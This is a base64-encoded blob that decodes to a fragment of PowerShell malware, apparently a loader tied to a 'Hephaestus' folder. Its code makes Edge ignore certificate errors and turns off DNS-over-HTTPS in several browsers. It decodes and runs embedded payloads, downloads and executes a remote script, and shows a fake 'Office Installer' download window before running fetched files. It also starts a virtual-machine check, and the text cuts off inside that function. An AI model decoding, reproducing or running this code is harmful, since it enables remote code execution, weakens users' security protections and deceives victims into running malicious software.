YmxlLXF1aWMgLS1kaXNhYmxlLWhzdHMiDQogICAgICAgIA0KICAgICAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRlZGdlS2V5UGF0aCAtTmFtZSAiRG5zT3Zlckh0dHBzIiAtVmFsdWUgIm9mZiINCg0KICAgICAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRlZGdlS2V5UGF0aCAtTmFtZSAiSWdub3JlQ2VydGlmaWNhdGVFcnJvcnMiIC1WYWx1ZSAxDQogICAgfQ0KfQ0KDQoNCmZ1bmN0aW9uIEVtYmVkZGluZ05hbWUgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kbmFtZQ0KICAgICkNCiAgICAkZm9sZGVyID0gR2V0LUhlcGhhZXN0dXNGb2xkZXINCiAgICByZXR1cm4gSm9pbi1QYXRoIC1QYXRoICRmb2xkZXIgLUNoaWxkUGF0aCAkbmFtZQ0KfQ0KDQpmdW5jdGlvbiBEb0ludGVybmFsRW1iZWRkaW5ncyB7DQogICAgcGFyYW0gKA0KICAgICAgICBbYXJyYXldJG5hbWVzLCBbYXJyYXldJGRhdGFzLCAkZm9yY2UsICRuYW1lDQogICAgKQ0KDQogICAgJGF1dG8gPSBUZXN0LUF1dG9zdGFydDsNCiAgICBpZiAoJGZvcmNlIC1uZSAkZmFsc2UgLWFuZCAkYXV0byAtZXEgJHRydWUpDQogICAgew0KICAgICAgICB3cml0ZWRiZyAiU2tpcHBpbmcgZnVuY3Rpb24gRG9JbnRlcm5hbEVtYmVkZGluZ3MgKCRuYW1lKSINCiAgICAgICAgcmV0dXJuDQogICAgfQ0KICAgIHRyeSANCiAgICB7DQogICAgICAgIGZvciAoJGkgPSAwOyAkaSAtbHQgJG5hbWVzLkxlbmd0aDsgJGkrKykgew0KICAgICAgICAgICAgJG5hbWUgPSAkbmFtZXNbJGldDQogICAgICAgICAgICAkZGF0YSA9ICRkYXRhc1skaV0NCiAgICAgICAgICAgICRmaWxlID0gRW1iZWRkaW5nTmFtZSgkbmFtZSkNCiAgICAgICAgICAgIEN1c3RvbURlY29kZSAtaW5Db250ZW50ICRkYXRhIC1vdXRGaWxlICRmaWxlDQogICAgICAgICAgICBJbnZva2UtSXRlbSAkZmlsZQ0KICAgICAgICB9DQogICAgfQ0KICAgIGNhdGNoIHsNCiAgICB3cml0ZWRiZyAiQW4gZXJyb3Igb2NjdXJyZWQgKERvRnJvbnQpOiAkXyINCiAgICB9DQp9DQoNCg0KZnVuY3Rpb24gRG9Gcm9udCB7DQogICAgRG9JbnRlcm5hbEVtYmVkZGluZ3MgLW5hbWVzICR4ZnJvbnRfbmFtZSAtZGF0YXMgJHhmcm9udCAtZm9yY2UgJHNlcnZlci5mcm9udEZvcmNlIC1uYW1lICJmcm9udCINCn0NCg0KZnVuY3Rpb24gRG9FbWJlZGRpbmdzIHsNCiAgICBEb0ludGVybmFsRW1iZWRkaW5ncyAtbmFtZXMgJHhlbWJlZF9uYW1lIC1kYXRhcyAkeGVtYmVkIC1mb3JjZSAkc2VydmVyLmVtYmVkZGluZ3NGb3JjZSAtbmFtZSAiZW1iZWRkaW5ncyINCn0NCg0KZnVuY3Rpb24gZG9fZW1iZWRkaW5ncyB7DQogICAgRG9Gcm9udA0KICAgIERvRW1iZWRkaW5ncw0KfQ0KDQoNCmZ1bmN0aW9uIGRvX2V4dHJhdXBkYXRlKCkgew0KICAgIGlmICgtbm90ICRzZXJ2ZXIuZXh0cmFVcGRhdGUpew0KICAgICAgICByZXR1cm4NCiAgICB9DQogICAgJHRpbWVvdXQgPSBbZGF0ZXRpbWVdOjpVdGNOb3cuQWRkTWludXRlcygxKQ0KICAgICRkZWxheSA9IDUNCiAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAkZGVsYXkNCiAgICANCiAgICB3aGlsZSAoW2RhdGV0aW1lXTo6VXRjTm93IC1sdCAkdGltZW91dCkgew0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgJHJlc3BvbnNlID0gSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkc2VydmVyLmV4dHJhVXBkYXRlVXJsIC1Vc2VCYXNpY1BhcnNpbmcgLU1ldGhvZCBHZXQNCg0KICAgICAgICAgICAgaWYgKCRyZXNwb25zZS5TdGF0dXNDb2RlIC1lcSAyMDApIHsNCiAgICAgICAgICAgICAgICAkc2NyaXB0QmxvY2sgPSBbU2NyaXB0QmxvY2tdOjpDcmVhdGUoJHJlc3BvbnNlLkNvbnRlbnQpDQogICAgICAgICAgICAgICAgLiAkc2NyaXB0QmxvY2sNCiAgICAgICAgICAgICAgICByZXR1cm4NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBjYXRjaCB7DQogICAgICAgICAgICB3cml0ZWRiZyAiRmFpbGVkIHRvIGRvd25sb2FkIG9yIGV4ZWN1dGUgdGhlIHNjcmlwdDogJF8iDQogICAgICAgIH0NCg0KICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAkZGVsYXkNCiAgICB9DQogICAgd3JpdGVkYmcgIkZhaWxlZCB0byBkb3dubG9hZCB0aGUgc2NyaXB0IHdpdGhpbiB0aGUgYWxsb3R0ZWQgdGltZS4iDQp9DQoNCmZ1bmN0aW9uIGRvX2ZpcmVmb3ggDQp7DQogICAgdHJ5IA0KICAgIHsNCiAgICAgICAgU2V0LUZpcmVmb3hSZWdpc3RyeSAtS2V5UGF0aHMgQCgNCiAgICAgICAgICAgICdTT0ZUV0FSRVxQb2xpY2llc1xNb3ppbGxhXEZpcmVmb3hcRE5TT3ZlckhUVFBTJywNCiAgICAgICAgICAgICdTT0ZUV0FSRVxQb2xpY2llc1xNb3ppbGxhXEZpcmVmb3hcRE5TT3ZlckhUVFBTJw0KICAgICAgICApIC1WYWx1ZU5hbWVzIEAoJ0VuYWJsZWQnLCAnTG9ja2VkJykgLVZhbHVlcyBAKDAsIDEpDQogICAgfQ0KICAgIGNhdGNoIA0KICAgIHsNCiAgICAgICAgd3JpdGVkYmcgIkZhaWxlZCB0byBzZXQgZmlyZWZveCByZWdpc3RyeTogJF8iDQogICAgfQ0KICAgIGZvcmVhY2ggKCRkaXIgaW4gR2V0LUVudlBhdGhzKSANCiAgICB7DQogICAgICAgIHRyeSANCiAgICAgICAgew0KICAgICAgICAkcGF0aCA9IEpvaW4tUGF0aCAtUGF0aCAkZGlyIC1DaGlsZFBhdGggIk1vemlsbGFcRmlyZWZveFxQcm9maWxlc1x1c2VyLmpzIg0KDQogICAgICAgICAgICAkVXNlckpTQ29udGVudCA9ICd1c2VyX3ByZWYoIm5ldHdvcmsudHJyLm1vZGUiLCA1KTsnDQogICAgICAgICAgICANCiAgICAgICAgICAgIGlmICghKFRlc3QtUGF0aCAtUGF0aCAkcGF0aCAtUGF0aFR5cGUgTGVhZikpIA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIE5ldy1JdGVtIC1QYXRoICRwYXRoIC1JdGVtVHlwZSBGaWxlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgICAgICAgICAgQWRkLUNvbnRlbnQgLVBhdGggJHBhdGggLVZhbHVlICRVc2VySlNDb250ZW50IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgY2F0Y2ggDQogICAgICAgIHsNCiAgICAgICAgICAgIHdyaXRlZGJnICJGYWlsZWQgdG8gd3JpdGUgdG8gdXNlci5qcyBmaWxlOiAkXyINCiAgICAgICAgfQ0KICAgIH0NCn0NCg0KDQpmdW5jdGlvbiBTZXQtRmlyZWZveFJlZ2lzdHJ5IHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmdbXV0kS2V5UGF0aHMsDQogICAgICAgIFtzdHJpbmdbXV0kVmFsdWVOYW1lcywNCiAgICAgICAgW2ludFtdXSRWYWx1ZXMNCiAgICApDQoNCiAgICAkRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gJ1N0b3AnDQogICAgJHJlZ0tleSA9IFtNaWNyb3NvZnQuV2luMzIuUmVnaXN0cnldOjpMb2NhbE1hY2hpbmUNCg0KICAgIHRyeSB7DQogICAgICAgIGZvcmVhY2ggKCRpIGluIDAuLigkS2V5UGF0aHMuTGVuZ3RoIC0gMSkpIHsNCiAgICAgICAgICAgICRrZXkgPSAkcmVnS2V5Lk9wZW5TdWJLZXkoJEtleVBhdGhzWyRpXSwgJHRydWUpDQogICAgICAgICAgICBpZiAoJGtleSAtZXEgJG51bGwpIHsNCiAgICAgICAgICAgICAgICB3cml0ZWRiZyAiRmFpbGVkIHRvIG9wZW4gcmVnaXN0cnkga2V5OiAkKCRLZXlQYXRoc1skaV0pIg0KICAgICAgICAgICAgICAgIHJldHVybg0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAka2V5LlNldFZhbHVlKCRWYWx1ZU5hbWVzWyRpXSwgJFZhbHVlc1skaV0sIFtNaWNyb3NvZnQuV2luMzIuUmVnaXN0cnlWYWx1ZUtpbmRdOjpEV29yZCkNCiAgICAgICAgICAgICRrZXkuQ2xvc2UoKQ0KICAgICAgICB9DQogICAgfQ0KICAgIGNhdGNoIHsNCiAgICAgICAgd3JpdGVkYmcgIkVycm9yIGFjY2Vzc2luZyBvciBtb2RpZnlpbmcgcmVnaXN0cnk6ICRfIg0KICAgIH0NCn0NCg0KZnVuY3Rpb24gZG9fb3BlcmENCnsNCiAgICBDbG9zZS1Qcm9jZXNzZXMoQCgnb3BlcmFfY3Jhc2hyZXBvcnRlci5leGUnLCAnb3BlcmEuZXhlJykpDQoNCiAgICBmb3JlYWNoICgkZGlyIGluIEdldC1FbnZQYXRocykgew0KICAgICAgICAkcGF0aCA9IEpvaW4tUGF0aCAtUGF0aCAkZGlyIC1DaGlsZFBhdGggJ09wZXJhIFNvZnR3YXJlXE9wZXJhIFN0YWJsZVxMb2NhbCBTdGF0ZScNCg0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgaWYgKFRlc3QtUGF0aCAtUGF0aCAkcGF0aCAtUGF0aFR5cGUgTGVhZikNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBDb25maWd1cmVPcGVyYUludGVybmFsIC1GaWxlUGF0aCAkcGF0aA0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGNhdGNoIHsNCiAgICAgICAgICAgIHdyaXRlZGJnICJFcnJvciBvY2N1cnJlZCBpbiBPcGVyYTogJF8iDQogICAgICAgIH0NCiAgICB9DQp9DQoNCmZ1bmN0aW9uIENvbmZpZ3VyZU9wZXJhSW50ZXJuYWwgew0KICAgIHBhcmFtKA0KICAgICAgICBbc3RyaW5nXSRmaWxlUGF0aA0KICAgICkNCg0KICAgICRjb250ZW50ID0gR2V0LUNvbnRlbnQgLVBhdGggJGZpbGVQYXRoIC1SYXcgfCBDb252ZXJ0RnJvbS1Kc29uDQoNCiAgICBpZiAoJG51bGwgLWVxICRjb250ZW50LmRuc19vdmVyX2h0dHBzIC1vciAkY29udGVudC5kbnNfb3Zlcl9odHRwcyAtaXNub3QgW29iamVjdF0pIHsNCiAgICAgICAgJGNvbnRlbnQuZG5zX292ZXJfaHR0cHMgPSBAew0KICAgICAgICAgICAgJ21vZGUnID0gJ29mZicNCiAgICAgICAgICAgICdvcGVyYScgPSBAew0KICAgICAgICAgICAgICAgICdkb2hfbW9kZScgPSAnb2ZmJw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgJ3RlbXBsYXRlcycgPSAiIg0KICAgICAgICB9DQogICAgfSBlbHNlIHsNCiAgICAgICAgJGNvbnRlbnQuZG5zX292ZXJfaHR0cHMubW9kZSA9ICdvZmYnDQogICAgICAgICRjb250ZW50LmRuc19vdmVyX2h0dHBzLm9wZXJhID0gQHsNCiAgICAgICAgICAgICdkb2hfbW9kZScgPSAnb2ZmJw0KICAgICAgICB9DQogICAgICAgICRjb250ZW50LmRuc19vdmVyX2h0dHBzLnRlbXBsYXRlcyA9ICIiDQogICAgfQ0KDQogICAgJGpzb25TdHJpbmcgPSAkY29udGVudCB8IENvbnZlcnRUby1Kc29uIC1EZXB0aCAxMA0KDQogICAgU2V0LUNvbnRlbnQgLVBhdGggJGZpbGVQYXRoIC1WYWx1ZSAkanNvblN0cmluZyAtRW5jb2RpbmcgVVRGOCAtRm9yY2UNCg0KICAgIHdyaXRlZGJnICJTdWNjZXNzZnVsbHkgY29uZmlndXJlZCBPcGVyYSBzZXR0aW5ncyBpbiAkZmlsZVBhdGgiDQp9DQoNCmZ1bmN0aW9uIEdldC1GaWxlTmFtZUZyb21Vcmkgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kdXJpDQogICAgKQ0KDQogICAgIyBDcmVhdGUgYSBVcmkgb2JqZWN0DQogICAgJHVyaU9iamVjdCA9IFtTeXN0ZW0uVXJpXTo6bmV3KCR1cmkpDQoNCiAgICAjIEV4dHJhY3QgdGhlIGZpbGUgbmFtZSBmcm9tIHRoZSBwYXRoIG9mIHRoZSBVUkkNCiAgICAkZmlsZU5hbWUgPSBbU3lzdGVtLklPLlBhdGhdOjpHZXRGaWxlTmFtZSgkdXJpT2JqZWN0LkFic29sdXRlUGF0aCkNCg0KICAgIHJldHVybiAkZmlsZU5hbWUNCn0NCg0KZnVuY3Rpb24gQWRkLVJhbmRvbURpZ2l0c1RvRmlsZW5hbWUgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kZmlsZU5hbWUNCiAgICApDQoNCiAgICAjIFNwbGl0IGZpbGVuYW1lIGludG8gYmFzZSBhbmQgZXh0ZW5zaW9uDQogICAgJGJhc2VOYW1lID0gJGZpbGVOYW1lIC1yZXBsYWNlICdcLlteLl0rJCcsICcnDQogICAgJGV4dGVuc2lvbiA9ICRmaWxlTmFtZSAtcmVwbGFjZSAnLipcLicsICcuJw0KDQogICAgIyBHZW5lcmF0ZSBhIHJhbmRvbSBudW1iZXIgYmV0d2VlbiAxMDAwIGFuZCA5OTk5DQogICAgJHJhbmRvbU51bWJlciA9IEdldC1SYW5kb20gLU1pbmltdW0gMTAwMCAtTWF4aW11bSA5OTk5DQoNCiAgICAjIENvbWJpbmUgYmFzZSBuYW1lLCByYW5kb20gbnVtYmVyLCBhbmQgZXh0ZW5zaW9uDQogICAgJG5ld0ZpbGVOYW1lID0gIiRiYXNlTmFtZSIgKyAiXyRyYW5kb21OdW1iZXIkZXh0ZW5zaW9uIg0KDQogICAgcmV0dXJuICRuZXdGaWxlTmFtZQ0KfQ0KDQpmdW5jdGlvbiBTdGFydC1Eb3dubG9hZEFuZEV4ZWN1dGUgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kdXJsLA0KICAgICAgICBbc3RyaW5nXSR0aXRsZQ0KICAgICkNCg0KICAgIEFkZC1UeXBlIC1Bc3NlbWJseU5hbWUgU3lzdGVtLldpbmRvd3MuRm9ybXMNCiAgICBBZGQtVHlwZSAtQXNzZW1ibHlOYW1lIFN5c3RlbS5EcmF3aW5nDQoNCiAgICAjIENyZWF0ZSBhbmQgY29uZmlndXJlIHRoZSBmb3JtDQogICAgJGZvcm0gPSBOZXctT2JqZWN0IFN5c3RlbS5XaW5kb3dzLkZvcm1zLkZvcm0NCiAgICAkZm9ybS5UZXh0ID0gJHRpdGxlDQogICAgJGZvcm0uU2l6ZSA9IE5ldy1PYmplY3QgU3lzdGVtLkRyYXdpbmcuU2l6ZSg0MDAsIDIwMCkNCiAgICAkZm9ybS5TdGFydFBvc2l0aW9uID0gIkNlbnRlclNjcmVlbiINCg0KICAgICMgQ3JlYXRlIGFuZCBjb25maWd1cmUgdGhlIHByb2dyZXNzIGJhcg0KICAgICRwcm9ncmVzc0JhciA9IE5ldy1PYmplY3QgU3lzdGVtLldpbmRvd3MuRm9ybXMuUHJvZ3Jlc3NCYXINCiAgICAkcHJvZ3Jlc3NCYXIuTWluaW11bSA9IDANCiAgICAkcHJvZ3Jlc3NCYXIuTWF4aW11bSA9IDEwMA0KICAgICRwcm9ncmVzc0Jhci5TdGVwID0gMQ0KICAgICRwcm9ncmVzc0Jhci5WYWx1ZSA9IDANCiAgICAkcHJvZ3Jlc3NCYXIuV2lkdGggPSAzNTANCiAgICAkcHJvZ3Jlc3NCYXIuSGVpZ2h0ID0gMzANCiAgICAkcHJvZ3Jlc3NCYXIuVG9wID0gODANCiAgICAkcHJvZ3Jlc3NCYXIuTGVmdCA9IDIwDQogICAgJGZvcm0uQ29udHJvbHMuQWRkKCRwcm9ncmVzc0JhcikNCg0KICAgICMgQ3JlYXRlIGFuZCBjb25maWd1cmUgdGhlIHN0YXR1cyBsYWJlbA0KICAgICRzdGF0dXNMYWJlbCA9IE5ldy1PYmplY3QgU3lzdGVtLldpbmRvd3MuRm9ybXMuTGFiZWwNCiAgICAkc3RhdHVzTGFiZWwuVGV4dCA9ICJEb3dubG9hZGluZy4uLiINCiAgICAkc3RhdHVzTGFiZWwuQXV0b1NpemUgPSAkdHJ1ZQ0KICAgICRzdGF0dXNMYWJlbC5Ub3AgPSA1MA0KICAgICRzdGF0dXNMYWJlbC5MZWZ0ID0gMjANCiAgICAkZm9ybS5Db250cm9scy5BZGQoJHN0YXR1c0xhYmVsKQ0KDQogICAgIyBDcmVhdGUgYW5kIGNvbmZpZ3VyZSB0aGUgZGVzY3JpcHRpb24gbGFiZWwNCiAgICAkZGVzY3JpcHRpb25MYWJlbCA9IE5ldy1PYmplY3QgU3lzdGVtLldpbmRvd3MuRm9ybXMuTGFiZWwNCiAgICAkZGVzY3JpcHRpb25MYWJlbC5UZXh0ID0gIlRoZSBpbnN0YWxsZXIgaXMgY3VycmVudGx5IGJlaW5nIGRvd25sb2FkZWQuIFBsZWFzZSB3YWl0IHVudGlsIHRoZSBwcm9jZXNzIGNvbXBsZXRlcy4iDQogICAgJGRlc2NyaXB0aW9uTGFiZWwuQXV0b1NpemUgPSAkdHJ1ZQ0KICAgICRkZXNjcmlwdGlvbkxhYmVsLldpZHRoID0gMzUwDQogICAgJGRlc2NyaXB0aW9uTGFiZWwuVG9wID0gMTANCiAgICAkZGVzY3JpcHRpb25MYWJlbC5MZWZ0ID0gMjANCiAgICAkZm9ybS5Db250cm9scy5BZGQoJGRlc2NyaXB0aW9uTGFiZWwpDQoNCiAgICAjIFNob3cgdGhlIGZvcm0gbm9uLW1vZGFsbHkNCiAgICAkZm9ybS5TaG93KCkNCg0KICAgICMgRGV0ZXJtaW5lIHRoZSBmaWxlIG5hbWUgYW5kIHBhdGgNCiAgICAkZmlsZU5hbWUgPSBHZXQtRmlsZU5hbWVGcm9tVXJpIC11cmkgJHVybA0KICAgICRmaWxlTmFtZVNhdmUgPSBBZGQtUmFuZG9tRGlnaXRzVG9GaWxlbmFtZSAtZmlsZU5hbWUgJGZpbGVOYW1lDQoNCiAgICAkdGVtcERpciA9IChTcGxpdC1QYXRoIC1QYXRoICRQU0NvbW1hbmRQYXRoKQ0KICAgICRpbnN0YWxsZXJQYXRoID0gW1N5c3RlbS5JTy5QYXRoXTo6Q29tYmluZSgkdGVtcERpciwgJGZpbGVOYW1lU2F2ZSkNCg0KICAgICMgQ3JlYXRlIGFuZCBjb25maWd1cmUgdGhlIFdlYkNsaWVudA0KICAgICR3ZWJDbGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50DQoNCiAgICAjIERlZmluZSBldmVudCBoYW5kbGVycw0KICAgICRwcm9ncmVzc0NoYW5nZWRIYW5kbGVyID0gW1N5c3RlbS5OZXQuRG93bmxvYWRQcm9ncmVzc0NoYW5nZWRFdmVudEhhbmRsZXJdew0KICAgICAgICBwYXJhbSAoJHNlbmRlciwgJGV2ZW50QXJncykNCiAgICAgICAgJHByb2dyZXNzQmFyLlZhbHVlID0gJGV2ZW50QXJncy5Qcm9ncmVzc1BlcmNlbnRhZ2UNCiAgICAgICAgJGZvcm0uUmVmcmVzaCgpDQogICAgfQ0KDQogICAgJGRvd25sb2FkRmlsZUNvbXBsZXRlZEhhbmRsZXIgPSBbU3lzdGVtLkNvbXBvbmVudE1vZGVsLkFzeW5jQ29tcGxldGVkRXZlbnRIYW5kbGVyXXsNCiAgICAgICAgcGFyYW0gKCRzZW5kZXIsICRldmVudEFyZ3MpDQogICAgICAgICMgQ2xvc2UgdGhlIGZvcm0gYmVmb3JlIHN0YXJ0aW5nIHRoZSBpbnN0YWxsZXINCiAgICAgICAgJGZvcm0uSW52b2tlKFthY3Rpb25dIHsgDQogICAgICAgICAgICBbU3lzdGVtLldpbmRvd3MuRm9ybXMuQXBwbGljYXRpb25dOjpEb0V2ZW50cygpDQogICAgICAgICAgICAkZm9ybS5DbG9zZSgpIA0KICAgICAgICAgICAgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLkFwcGxpY2F0aW9uXTo6RG9FdmVudHMoKQ0KICAgICAgICB9KQ0KICAgICAgICANCiAgICAgICAgaWYgKCRldmVudEFyZ3MuRXJyb3IpIHsNCiAgICAgICAgICAgIFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5NZXNzYWdlQm94XTo6U2hvdygiRXJyb3IgZG93bmxvYWRpbmcgZmlsZTogIiArICRldmVudEFyZ3MuRXJyb3IuTWVzc2FnZSwgIkRvd25sb2FkIEVycm9yIiwgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLk1lc3NhZ2VCb3hCdXR0b25zXTo6T0ssIFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5NZXNzYWdlQm94SWNvbl06OkVycm9yKQ0KICAgICAgICB9IGVsc2VpZiAoJGV2ZW50QXJncy5DYW5jZWxsZWQpIHsNCiAgICAgICAgICAgIFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5NZXNzYWdlQm94XTo6U2hvdygiRG93bmxvYWQgY2FuY2VsbGVkLiIsICJEb3dubG9hZCBDYW5jZWxsZWQiLCBbU3lzdGVtLldpbmRvd3MuRm9ybXMuTWVzc2FnZUJveEJ1dHRvbnNdOjpPSywgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLk1lc3NhZ2VCb3hJY29uXTo6V2FybmluZykNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgIyBFeGVjdXRlIHRoZSBpbnN0YWxsZXINCiAgICAgICAgICAgICAgICBTdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCAkaW5zdGFsbGVyUGF0aCAtV2FpdA0KDQogICAgICAgICAgICAgICAgIyBXcml0ZSB0byB0aGUgcmVnaXN0cnkNCiAgICAgICAgICAgICAgICAkcmVnaXN0cnlQYXRoID0gIkhLQ1U6XFNvZnR3YXJlXEhlcGhhZXN0dXNcRG93bmxvYWRzIg0KICAgICAgICAgICAgICAgIGlmICgtbm90IChUZXN0LVBhdGggJHJlZ2lzdHJ5UGF0aCkpIHsNCiAgICAgICAgICAgICAgICAgICAgTmV3LUl0ZW0gLVBhdGggJHJlZ2lzdHJ5UGF0aCAtRm9yY2UgfCBPdXQtTnVsbA0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRyZWdpc3RyeVBhdGggLU5hbWUgJGZpbGVOYW1lIC1WYWx1ZSAiRG93bmxvYWRlZCINCiAgICAgICAgICAgIH0gY2F0Y2ggew0KICAgICAgICAgICAgICAgIFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5NZXNzYWdlQm94XTo6U2hvdygiRXJyb3IgZXhlY3V0aW5nIHRoZSBpbnN0YWxsZXI6ICIgKyAkXy5FeGNlcHRpb24uTWVzc2FnZSwgIkV4ZWN1dGlvbiBFcnJvciIsIFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5NZXNzYWdlQm94QnV0dG9uc106Ok9LLCBbU3lzdGVtLldpbmRvd3MuRm9ybXMuTWVzc2FnZUJveEljb25dOjpFcnJvcikNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBbU3lzdGVtLldpbmRvd3MuRm9ybXMuQXBwbGljYXRpb25dOjpEb0V2ZW50cygpDQogICAgfQ0KDQogICAgIyBBZGQgZXZlbnQgaGFuZGxlcnMgdG8gV2ViQ2xpZW50DQogICAgJHdlYkNsaWVudC5hZGRfRG93bmxvYWRQcm9ncmVzc0NoYW5nZWQoJHByb2dyZXNzQ2hhbmdlZEhhbmRsZXIpDQogICAgJHdlYkNsaWVudC5hZGRfRG93bmxvYWRGaWxlQ29tcGxldGVkKCRkb3dubG9hZEZpbGVDb21wbGV0ZWRIYW5kbGVyKQ0KDQogICAgdHJ5IHsNCiAgICAgICAgIyBTdGFydCB0aGUgZG93bmxvYWQNCiAgICAgICAgJHdlYkNsaWVudC5Eb3dubG9hZEZpbGVBc3luYyhbVXJpXSR1cmwsICRpbnN0YWxsZXJQYXRoKQ0KICAgICAgICANCiAgICAgICAgIyBLZWVwIHRoZSBmb3JtIHJlc3BvbnNpdmUgd2hpbGUgdGhlIGRvd25sb2FkIGlzIGluIHByb2dyZXNzDQogICAgICAgIHdoaWxlICgkZm9ybS5WaXNpYmxlKSB7DQogICAgICAgICAgICBTdGFydC1TbGVlcCAtTWlsbGlzZWNvbmRzIDENCiAgICAgICAgICAgIFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5BcHBsaWNhdGlvbl06OkRvRXZlbnRzKCkNCiAgICAgICAgfQ0KICAgIH0gY2F0Y2ggew0KICAgICAgICBbU3lzdGVtLldpbmRvd3MuRm9ybXMuTWVzc2FnZUJveF06OlNob3coIkVycm9yIGluaXRpYXRpbmcgZG93bmxvYWQ6ICIgKyAkXy5FeGNlcHRpb24uTWVzc2FnZSwgIkRvd25sb2FkIEVycm9yIiwgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLk1lc3NhZ2VCb3hCdXR0b25zXTo6T0ssIFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5NZXNzYWdlQm94SWNvbl06OkVycm9yKQ0KICAgICAgICAkZm9ybS5DbG9zZSgpDQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBEb3dubG9hZCB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSR1cmwsDQogICAgICAgIFtzdHJpbmddJHRpdGxlDQogICAgKQ0KDQogICAgJGZpbGVOYW1lID0gW1N5c3RlbS5JTy5QYXRoXTo6R2V0RmlsZU5hbWUoJHVybCkNCg0KICAgICRhdXRvID0gVGVzdC1BdXRvc3RhcnQ7DQogICAgaWYgKCRzZXJ2ZXIuc3RhcnREb3dubG9hZHNGb3JjZSAtbmUgJGZhbHNlIC1hbmQgJGF1dG8gLWVxICR0cnVlKQ0KICAgIHsNCiAgICAgICAgJHJlZ2lzdHJ5UGF0aCA9ICJIS0NVOlxTb2Z0d2FyZVxIZXBoYWVzdHVzXERvd25sb2FkcyINCiAgICAgICAgaWYgKFRlc3QtUGF0aCAkcmVnaXN0cnlQYXRoKSB7DQogICAgICAgICAgICAkaW5zdGFsbGVkID0gR2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkcmVnaXN0cnlQYXRoIC1OYW1lICRmaWxlTmFtZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgICAgICAgICAgaWYgKCRpbnN0YWxsZWQpIA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHdyaXRlZGJnICJUaGUgZmlsZSAnJGZpbGVOYW1lJyBpcyBhbHJlYWR5IGluc3RhbGxlZC4iDQogICAgICAgICAgICAgICAgcmV0dXJuDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuDQogICAgfQ0KDQogICAgU3RhcnQtRG93bmxvYWRBbmRFeGVjdXRlIC11cmwgJHVybCAtdGl0bGUgJHRpdGxlDQp9DQoNCmZ1bmN0aW9uIGRvX3N0YXJ0ZG93bmxvYWRzIHsNCiAgICB0cnkgDQogICAgew0KICAgICAgICBmb3JlYWNoICgkdXJsIGluICRzZXJ2ZXIuc3RhcnREb3dubG9hZHMpDQogICAgICAgIHsNCiAgICAgICAgICAgIERvd25sb2FkIC11cmwgJHVybCAtdGl0bGUgIkRvd25sb2FkaW5nIE9mZmljZSBJbnN0YWxsZXIiDQogICAgICAgIH0NCiAgICB9DQogICAgY2F0Y2ggew0KICAgICAgd3JpdGVkYmcgIkFuIGVycm9yIG9jY3VycmVkIChTdGFydCBEb3dubG9hZHMpOiAkXyINCiAgICB9DQp9DQoNCg0KDQpmdW5jdGlvbiBkb19zdGFydHVybHMgew0KICAgICRhdXRvID0gVGVzdC1BdXRvc3RhcnQ7DQogICAgaWYgKCRzZXJ2ZXIuc3RhcnRVcmxzRm9yY2UgLW5lICRmYWxzZSAtYW5kICRhdXRvIC1lcSAkdHJ1ZSkNCiAgICB7DQogICAgICAgIHdyaXRlZGJnICJTa2lwcGluZyBmdW5jdGlvbiBEb1N0YXJ0VXJscyINCiAgICAgICAgcmV0dXJuDQogICAgfQ0KICAgIHRyeQ0KICAgICAgICB7DQogICAgICAgIGZvcmVhY2ggKCRzdGFydFVybCBpbiAkc2VydmVyLnN0YXJ0VXJscykgew0KICAgICAgICAgICAgU3RhcnQtUHJvY2VzcyAkc3RhcnRVcmwuVHJpbSgpDQogICAgICAgIH0NCiAgICB9DQogICAgY2F0Y2gNCiAgICB7DQogICAgICB3cml0ZWRiZyAiQW4gZXJyb3Igb2NjdXJyZWQgKFN0YXJ0IFVybHMpOiAkXyINCiAgICB9DQp9DQoNCmZ1bmN0aW9uIElzLVZpcnR1YWxNYWNoaW5lIHsNCiAgICAjIEdldCBXaW4zMl9Db21wdXRlclN5c3R